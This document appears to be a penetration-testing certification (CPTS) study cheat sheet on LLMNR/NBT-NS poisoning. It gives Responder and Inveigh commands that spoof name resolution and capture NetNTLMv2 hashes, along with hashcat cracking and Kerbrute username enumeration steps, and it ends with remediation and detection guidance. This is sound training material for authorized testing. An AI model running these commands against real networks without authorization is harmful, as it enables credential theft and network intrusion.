# CPTS Cheat Sheet — LLMNR/NBT-NS Poisoning




## 1. Core Idea

### Name-resolution fallback

```text
Client asks DNS for NAME
        |
        +--> DNS resolves it      -> normal connection
        |
        +--> DNS fails
                |
                +--> LLMNR broadcast (UDP/5355)
                |
                +--> NBT-NS broadcast (UDP/137)
                         |
                         +--> attacker answers
                                  |
                                  +--> victim connects to attacker
                                  |
                                  +--> NTLM authentication
                                           |
                                           +--> NetNTLMv1/v2 captured
                                                    |
                                                    +--> crack offline
                                                    |
                                                    +--> relay (later topic)
```

### Why it works

- LLMNR/NBT-NS are fallback name-resolution mechanisms.
- A host on the local broadcast domain can answer the request.
- The victim may authenticate to the rogue responder using NTLM.
- Captured material is commonly **NetNTLMv2**, not the user's NT hash.
- **NetNTLMv2 normally must be cracked offline before using the password directly.**
- Relay is a separate attack path and depends on conditions such as service protections/signing.

---

## 2. Protocols & Ports

| Protocol | Purpose | Port |
|---|---|---:|
| DNS | Normal name resolution | UDP/TCP 53 |
| LLMNR | Local-link name resolution fallback | UDP 5355 |
| NBT-NS / NBNS | NetBIOS name resolution | UDP 137 |
| mDNS | Multicast DNS | UDP 5353 |
| SMB | Common authentication target/capture path | TCP 445 |
| HTTP | Responder/Inveigh web authentication capture | TCP 80 |
| LDAP | AD service / later relay target | TCP 389 |
| LDAPS | LDAP over TLS | TCP 636 |
| MSSQL | SQL Server | TCP 1433 |

### Exam trigger

```text
DNS fails -> think LLMNR/NBT-NS
LLMNR = UDP 5355
NBT-NS = UDP 137
```

---

## 3. Attack Prerequisites

Before poisoning:

```text
[ ] Inside correct broadcast domain / L2 segment
[ ] Correct interface identified
[ ] Testing is explicitly in scope
[ ] Understand what protocols/services the tool will answer
[ ] Record attacker IP + victim subnet
[ ] Check for port conflicts if listeners fail
```

Useful interface checks:

```bash
ip -br a
ip route
sudo ss -lntup
```

---

# 4. Responder — Linux

## Analyze first (passive)

**Does NOT poison.** Use this to see whether useful requests exist.

```bash
sudo responder -I <iface> -A
```

Example:

```bash
sudo responder -I ens224 -A
```

### What to look for

```text
LLMNR request
NBT-NS request
BROWSER traffic
mDNS requests
Source IP / hostname
Requested name
```

### CPTS distinction

```text
-A  = Analyze only
No poisoned response
Good for initial observation / validation
```

---

## Active poisoning

Basic:

```bash
sudo responder -I <iface>
```

More visible/common options from the module:

```bash
sudo responder -I <iface> -wrf
```

### Key options

| Flag | Meaning |
|---|---|
| `-I <iface>` | Interface to use |
| `-A` | Analyze mode; do not respond |
| `-f` | Fingerprint requesting host |
| `-w` | Start WPAD rogue proxy |
| `-r` | Answer NetBIOS wredir suffix queries |
| `-d` | Answer NetBIOS domain suffix queries |
| `-v` | More verbose output |
| `-h` | Help |

### Practical rule

```text
Start with:
sudo responder -I <iface> -A

If traffic confirms the environment is suitable:
sudo responder -I <iface>
```

---

# 5. Responder: What "Success" Looks Like

Typical flow:

```text
[+] LLMNR request received
[+] Response sent
[+] Victim connects to TCP/445
[+] NTLM challenge/response observed
[+] NetNTLM hash written to logs
```

A captured entry may look like:

```text
USERNAME::DOMAIN:CHALLENGE:RESPONSE:...
```

### Important

The captured value is typically:

```text
NetNTLMv2 challenge-response
```

It is **not** the same thing as:

```text
NT hash
```

Therefore:

```text
NetNTLMv2
   |
   +--> offline password cracking
   |
   +--> possible relay under suitable conditions
```

---

# 6. Responder Logs

Typical location:

```bash
/usr/share/responder/logs/
```

List captures:

```bash
ls -lah /usr/share/responder/logs/
```

Common naming pattern:

```text
SMB-NTLMv2-SSP-<client-ip>.txt
HTTP-NTLMv2-<client-ip>.txt
```

Example:

```text
SMB-NTLMv2-SSP-172.16.5.25.txt
HTTP-NTLMv2-172.16.5.200.txt
```

### Save evidence

```text
[ ] Hash/capture
[ ] Timestamp
[ ] Victim IP
[ ] Victim hostname
[ ] Username
[ ] Protocol used
[ ] Tool output / logs
[ ] Scope notes
```

---

# 7. Responder Listener Problems

If you see errors such as:

```text
Error starting HTTP listener
socket ... forbidden by its access permissions
```

Think:

```text
Port already in use
        |
        +--> another listener/service
        +--> another security tool
        +--> previous session not fully stopped
```

Check:

```bash
sudo ss -lntup
```

Find a specific port:

```bash
sudo ss -lntup | grep ':80 '
sudo ss -lntup | grep ':445 '
```

**Do not blindly kill services on a client network.** Identify the owner and make sure changing it is in scope.

---

# 8. Hash Cracking — NetNTLMv2

## Hashcat mode

```text
5600 = NetNTLMv2
```

Basic:

```bash
hashcat -m 5600 <hashfile> <wordlist>
```

Example:

```bash
hashcat -m 5600 captured.txt /usr/share/wordlists/rockyou.txt
```

Show recovered credentials later:

```bash
hashcat -m 5600 <hashfile> --show
```

### Mental model

```text
capture
   |
   v
identify hash type
   |
   v
Hashcat mode 5600
   |
   v
offline cracking
   |
   +--> password recovered
           |
           +--> validate against authorized external/internal service
```

### CPTS reminders

- Crack **selectively**; prioritize accounts that may help you progress.
- Record which username produced the password.
- Large/complex passwords may not crack within the engagement window.
- NetNTLMv2 is not directly equivalent to a reusable NT hash.

---

# 9. Kerberos Username Enumeration Connection

LLMNR/NBT-NS poisoning is one way to obtain credentials.

Another early-domain technique from the surrounding module:

```text
Kerbrute -> valid AD usernames
```

Typical command:

```bash
kerbrute userenum \
  -d <DOMAIN> \
  --dc <DC-IP> \
  <username-wordlist> \
  -o valid_ad_users
```

Example:

```bash
kerbrute userenum \
  -d INLANEFREIGHT.LOCAL \
  --dc 172.16.5.5 \
  jsmith.txt \
  -o valid_ad_users
```

### Critical warning

```text
Failed Kerberos pre-auth attempts can count as failed logins.
Account lockout policy matters.
```

---

# 10. Inveigh — Windows

Use when your attack platform is Windows or you land on a suitable Windows host.

## PowerShell version

Import:

```powershell
Import-Module .\Inveigh.ps1
```

View parameters:

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Start LLMNR + NBNS spoofing with console/file output:

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Useful concepts

```text
LLMNR spoofing      -> ON
NBNS spoofing       -> ON
Console output      -> ON
File output         -> ON
SMB capture         -> commonly enabled
HTTP capture        -> commonly enabled
```

---

# 11. Inveigh C# / InveighZero

Example:

```powershell
.\Inveigh.exe
```

Typical startup output tells you:

```text
Packet sniffer addresses
Listener addresses
Spoofer reply addresses
LLMNR status
NBNS status
HTTP/HTTPS status
SMB capture status
LDAP listener status
File output path
```

### Read `[+]` vs `[ ]`

```text
[+] = enabled
[ ] = disabled
[-] = event/error/ignored condition (context matters)
```

---

# 12. Inveigh Interactive Console

Press:

```text
ESC
```

Then:

```text
HELP
```

High-value commands:

| Command | Purpose |
|---|---|
| `GET NTLMV2` | View captured NTLMv2 hashes |
| `GET NTLMV2UNIQUE` | One NTLMv2 hash per user |
| `GET NTLMV2USERNAMES` | Username/source mapping |
| `GET NTLMV1` | Captured NTLMv1 |
| `GET NTLMV1UNIQUE` | Unique NTLMv1 per user |
| `GET CLEARTEXT` | Captured cleartext credentials |
| `GET LOG` | View/filter logs |
| `GET CONSOLE` | View queued output |
| `HISTORY` | Command history |
| `RESUME` | Resume live output |
| `STOP` | Stop Inveigh |

### Best commands to remember for CPTS

```text
GET NTLMV2
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
GET CLEARTEXT
GET LOG
STOP
```

---

# 13. Reading Inveigh Output

Example:

```text
LLMNR(A) request [academy-ea-web0]
from 172.16.5.125
[response sent]
```

Interpretation:

```text
Victim asked for a name
        |
        v
Inveigh received request
        |
        v
Inveigh spoofed response
        |
        v
Victim connected toward attacker
```

If you see:

```text
SMB(445) negotiation
NTLM challenge
```

think:

```text
Authentication exchange is occurring
        |
        v
Look for captured NetNTLM material
```

---

# 14. LLMNR/NBT-NS vs mDNS

Do not mix these up.

| Protocol | Port | Scope/Use |
|---|---:|---|
| LLMNR | UDP 5355 | Local name resolution |
| NBT-NS | UDP 137 | NetBIOS name resolution |
| mDNS | UDP 5353 | Multicast DNS |

Responder/Inveigh may support all three, but a request being observed does **not** automatically mean the same protocol is being poisoned.

Example:

```text
mDNS request ... [spoofer disabled]
LLMNR request ... [response sent]
```

This means:

```text
mDNS observed but not answered
LLMNR observed and answered
```

---

# 15. Full CPTS Workflow

```text
1. Confirm scope + local segment
        |
        v
2. Identify interface
   ip -br a
   ip route
        |
        v
3. Passive observation
   sudo responder -I <iface> -A
        |
        v
4. See LLMNR/NBT-NS traffic?
        |
       YES
        |
        v
5. Start poisoning
   sudo responder -I <iface>
        |
        v
6. Wait while continuing enumeration
        |
        v
7. Capture NetNTLMv2
        |
        v
8. Save/log username + source + hash
        |
        v
9. Crack selectively
   hashcat -m 5600 ...
        |
        v
10. Validate recovered credential
        |
        v
11. Move to credentialed enumeration
```

---

# 16. What To Record in Your Notes

Use a table like this:

```text
Target subnet:
Attack host:
Interface:
Attacker IP:

Victim IP:
Victim hostname:
Requested name:
Protocol:
Username:
Hash type:
Capture file:
Cracked?:
Recovered password:
Potential privilege/value:
Next action:
```

Example:

```text
Victim IP:        172.16.5.125
Hostname:         ACADEMY-EA-FILE
Protocol:         SMB
Username:         INLANEFREIGHT\\forend
Hash type:        NetNTLMv2
Capture:          SMB-NTLMv2-SSP-172.16.5.125.txt
Cracked:          Yes
Next action:      Validate authorized access + begin credentialed enumeration
```

---

# 17. Stealth / Noise

### Non-evasive pentest

```text
Noise usually matters less
BUT scope + service stability still matter
```

### Evasive / red team

```text
Responder / Inveigh poisoning
        |
        +--> network traffic
        +--> abnormal name-resolution responses
        +--> NTLM authentication attempts
        +--> possible SOC alerts
```

**Do not equate "stealthier" with "safe."** The engagement rules determine what is permitted.

---

# 18. Remediation

### Disable LLMNR

Group Policy:

```text
Computer Configuration
  -> Administrative Templates
  -> Network
  -> DNS Client
  -> Turn OFF Multicast Name Resolution
```

### Disable NetBIOS over TCP/IP

Adapter:

```text
IPv4
  -> Properties
  -> Advanced
  -> WINS
  -> Disable NetBIOS over TCP/IP
```

### PowerShell via startup script

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"

Get-ChildItem $regkey | foreach {
    Set-ItemProperty `
      -Path "$regkey\$($_.PSChildName)" `
      -Name NetbiosOptions `
      -Value 2 `
      -Verbose
}
```

### Other mitigations

```text
[ ] SMB Signing enabled/required where appropriate
[ ] Network filtering for LLMNR/NBNS
[ ] Network segmentation
[ ] IDS/IPS monitoring
[ ] Reduce/disable unnecessary NTLM usage where practical
```

---

# 19. Detection

Look for:

```text
UDP 5355  -> LLMNR
UDP 137   -> NBT-NS
```

Useful detection idea:

```text
Non-existent hostname queries
        |
        v
Unexpected host answers
        |
        v
Possible poisoning
```

Other monitoring mentioned in the module:

```text
Windows Event ID 4697
Windows Event ID 7045
Registry:
HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient
```

LLMNR policy clue:

```text
EnableMulticast = 0
        -> LLMNR disabled
```

---

# 20. CPTS "Know This" Box

## If you see...

### `DNS failed -> broadcast asking who has this name`

Think:

```text
LLMNR / NBT-NS poisoning
```

### `UDP 5355`

Think:

```text
LLMNR
```

### `UDP 137`

Think:

```text
NBT-NS
```

### `Responder -A`

Think:

```text
Passive analysis only
```

### `Responder` without `-A`

Think:

```text
Active poisoning
```

### `SMB-NTLMv2-SSP-*`

Think:

```text
NetNTLMv2 capture
```

### `hashcat -m 5600`

Think:

```text
NetNTLMv2 cracking
```

### `NetNTLMv2 != NT hash`

Think:

```text
Usually crack offline first
```

### `GET NTLMV2UNIQUE`

Think:

```text
One unique captured NTLMv2 per user
```

### `GET NTLMV2USERNAMES`

Think:

```text
Username + source host/IP mapping
```

### `response sent`

Think:

```text
Poisoning response was actually issued
```

### `[spoofer disabled]`

Think:

```text
Observed traffic, but that protocol/request was not spoofed
```

---

# 21. One-Minute Revision

```text
LLMNR  = UDP 5355
NBT-NS = UDP 137
mDNS   = UDP 5353

Responder:
  -A            passive analysis
  -I <iface>    interface
  -f            fingerprint
  -w            WPAD
  -v            verbose

Default poisoning:
  sudo responder -I <iface>

NetNTLMv2:
  hashcat -m 5600 <hashfile> <wordlist>

Logs:
  /usr/share/responder/logs/

Inveigh:
  Import-Module .\\Inveigh.ps1
  Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

Inveigh console:
  GET NTLMV2
  GET NTLMV2UNIQUE
  GET NTLMV2USERNAMES
  GET CLEARTEXT
  GET LOG
  STOP

Attack chain:
  bad DNS lookup
      -> LLMNR/NBT-NS broadcast
      -> attacker answers
      -> victim authenticates
      -> NetNTLM capture
      -> crack / relay
      -> foothold
      -> credentialed AD enumeration
```

---

# 22. Common CPTS Mistakes

```text
[!] Confusing LLMNR (5355) with NBT-NS (137)
[!] Forgetting that -A is passive
[!] Treating NetNTLMv2 as an NT hash
[!] Not saving responder/inveigh output
[!] Cracking everything instead of prioritizing useful accounts
[!] Ignoring account lockout considerations for other credential attacks
[!] Ignoring port conflicts when listeners fail
[!] Poisoning outside the authorized broadcast domain
[!] Assuming observed mDNS traffic means mDNS poisoning is enabled
[!] Forgetting to record victim IP, hostname, username and protocol
```

---

## Bottom Line

```text
LLMNR/NBT-NS poisoning is primarily an
internal-network foothold technique.

The CPTS mental model is:

observe
  -> confirm fallback name resolution exists
  -> poison
  -> capture NTLM authentication
  -> identify hash type
  -> crack selectively
  -> validate credentials
  -> continue credentialed AD enumeration
```
